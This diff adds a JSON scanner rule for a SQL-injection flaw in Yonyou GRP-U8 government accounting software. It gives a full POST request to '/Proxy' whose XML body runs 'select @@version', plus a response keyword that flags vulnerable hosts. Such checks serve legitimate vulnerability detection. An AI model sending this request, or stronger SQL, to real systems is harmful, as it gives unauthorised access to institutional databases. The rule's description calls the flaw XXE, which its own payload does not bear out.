@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友 GRP-U8 Proxy 存在XXE SQL注入",
+    "level": "高危",
+    "description": "用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行.",
+    "product": "用友 GRP-U8 行政事业内控管理软件",
+    "version": "用友GRP-U8行政事业内控管理软件（新政府会计制度专版）",
+    "cve": "CNNVD-201610-923",
+    "reference": "https://peiqi.wgpsec.org/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html",
+    "fixing": "联系厂商打补丁",
+    "rule": {
+        "path": "/Proxy",
+        "method": "POST",
+        "headers": "Pragma: no-cache\r\nCache-Control: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 348",
+        "body": "cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>",
+        "status_code": "200",
+        "keywords": "Microsoft",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
